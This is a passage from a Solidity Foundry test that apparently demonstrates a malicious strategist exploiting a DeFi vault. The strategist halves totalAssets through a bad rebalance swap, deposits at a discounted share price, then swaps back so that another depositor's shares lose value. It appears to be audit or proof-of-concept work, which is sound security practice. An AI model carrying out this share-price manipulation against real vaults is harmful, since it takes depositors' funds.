...
contract CellarTest is Test {
    ...
    function testMaliciousStrategistWithBadSwapData() external {
        ...
        console.log("Total Assets", badCellar.totalAssets());

        // Now that totalAssets has been cut in half, strategist joins cellar at discounted rate.
        deal(address(USDC), address(this), amount);
        USDC.approve(address(badCellar), amount);
        badCellar.deposit(amount, address(this));

        assertEq(
            badCellar.balanceOf(address(this)),
            badCellar.balanceOf(alice),
            "Attacker and user should have the same amount of shares."
        );

        // Strategist calls rebalance again, but swaps WBTC for USDC.
        path[0] = address(WBTC);
        path[1] = address(USDC);
        amount = WBTC.balanceOf(address(badCellar));
        params = abi.encode(path, amount, 0);
        badCellar.rebalance(address(WBTC), address(USDC), amount, SwapRouter.Exchange.UNIV2, params);

        console.log("Total Assets", badCellar.totalAssets());

        console.log("Alice Share worth", badCellar.maxWithdraw(alice));
